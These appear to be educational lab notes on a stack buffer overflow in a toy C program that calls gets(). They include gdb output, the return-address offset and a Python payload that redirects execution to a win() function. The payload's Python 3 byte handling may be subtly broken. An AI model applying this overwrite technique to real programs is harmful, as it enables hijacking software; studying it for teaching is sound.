> [!exercise]+ Exercise - Exploiting Stack Overflow to Change Program Flow
>
> **Example Scenario:**
>
> A vulnerable C program has a function `hello()` that uses `gets()` to read user input into a buffer `buf` of size 17 bytes. The program is not supposed to reach the `win()` function, which prints "You win!". The goal is to exploit the stack overflow vulnerability to overwrite the return address and redirect program flow to the `win()` function.
>
> Here's the vulnerable C code:
>
> ```c
> #include <stdio.h>
> #include <stdlib.h>
>
> void win()
> {
>     printf("You win!\n");
> }
>
> void hello()
> {
>     char buf[17];
>     printf("What is your name? ");
>     gets(buf);
>     printf("Hello %s!\n", buf);
> }
>
> int main(int argc, char **argv)
> {
>     hello();
>     return 0;
> }
> ```

> [!exercise]+ Analyzing the Stack Frame
>
> 1. Set a breakpoint just before the `hello()` function ends and run the program with a pattern of 16 "A"s as input.
>
>    ```
>    (gdb) br 12
>    Breakpoint 1 at 0x1217: file flow.c, line 12.
>    (gdb) run < <(python -c 'print("A"*16)')
>    Starting program: /home/a1112407/ws5/flow < <(python3 -c 'print("A"*16)')
>    
>    Breakpoint 1, hello () at flow.c:12
>    12 printf("Hello %s!\n", buf);
>    ```
>
> 2. Use `info frame` to find the location of the saved return address (saved EIP) on the stack. In this case, it's at `0xffffd32c`.
>
>    ```
>    (gdb) info frame
>    Stack level 0, frame at 0xffffd330:
>     eip = 0x565562d7 in hello (flow.c:12); saved eip = 0x56556248
>     called by frame at 0xffffd340
>     source language c.
>     Arglist at 0xffffd328, args: 
>     Locals at 0xffffd328, Previous frame's sp is 0xffffd330
>     Saved registers:
>      ebx at 0xffffd324, ebp at 0xffffd328, eip at 0xffffd32c
>    ```
>
>    > [!consider]
>    > Let's clarify the different EIP values mentioned in the `info frame` output:
>    >
>    > 1. `current_instruction_pointer = 0x565562d7 in hello (flow.c:12)`:
>    >    - This is the current value of the EIP register, pointing to the next instruction to be executed within the `hello()` function.
>    >
>    > 2. `return_address = 0x56556248`:
>    >    - This is the saved return address (saved EIP) that determines where the program should continue execution after the `hello()` function returns.
>    >    - We want to overwrite this value with the address of the `win()` function to redirect the program flow.
>    >
>    > 3. `return_address_location = 0xffffd32c`:
>    >    - This is the memory address on the stack where the `return_address` is stored within the current stack frame.
>    >    - By overwriting the memory at this location with the address of the `win()` function, we can change the saved return address and alter the program flow.
>    ><br>
>
> 3. Use `x/40x $esp` to examine the stack contents. The series of `0x41414141` represents the 16 "A"s in the `buf` buffer.
>
>    ```
>    (gdb) x/40x $esp
>    0xffffd310:  0x41414141  0x41414141  0x41414141  0x41414141
>    0xffffd320:  0xf7fe4200  0x00000000  0xffffd338  0x56556248
>    0xffffd330:  0xf7fb3000  0xf7fb3000  0x00000000  0xf7dfa811
>    0xffffd340:  0x00000001  0xffffd3d4  0xffffd3dc  0xffffd364
>    ```
>
>    Notice that the `return_address` (`0x56556248`) can be found here too, confirming that this is the value we want to override.
>
> 4. Determine the address of the `win()` function using `print win`. In this example, it's at `0x565561b9`.
>
>    ```
>    (gdb) print win
>    $2 = {void ()} 0x565561b9
>    ```
>
>    We will use this address (`0x565561b9`) to overwrite the `return_address` stored at `return_address_location` and redirect execution to the `win()` function.



> [!exercise]+ Crafting the Exploit Payload
>
> 1. To overwrite the return address and redirect execution to `win()`, the payload needs to:
>    - Fill the `buf` buffer with 16 bytes of data ("A"s).
>    - Pad an additional 12 bytes to reach the saved return address.
>    - Overwrite the saved return address (`0x56556248`) with the address of `win()` (`0x565561b9`).
>
> 2. The Python payload to generate this exploit string is:
>    ```python
>    print("A"*28 + "\xb9\x61\x55\x56")
>    ```
>    - `"A"*28` fills the buffer and padding (16 + 12 bytes).
>    - `"\xb9\x61\x55\x56"` is the little-endian representation of `0x565561b9` (address of `win()`).
>
> **Why It Works:**
>
> - The `buf` buffer can hold 17 bytes, but `gets()` allows writing beyond the buffer size, overflowing the stack.
> - By carefully crafting the input, we can overwrite the saved return address (`0x56556248`) on the stack with the address of the `win()` function (`0x565561b9`).
> - When the `hello()` function returns, instead of returning to the original caller (`0x56556248`), it jumps to the `win()` function (`0x565561b9`), printing "You win!".
>
> This example demonstrates how stack overflow vulnerabilities can be exploited to manipulate program flow by overwriting the saved return address on the stack, allowing arbitrary code execution.
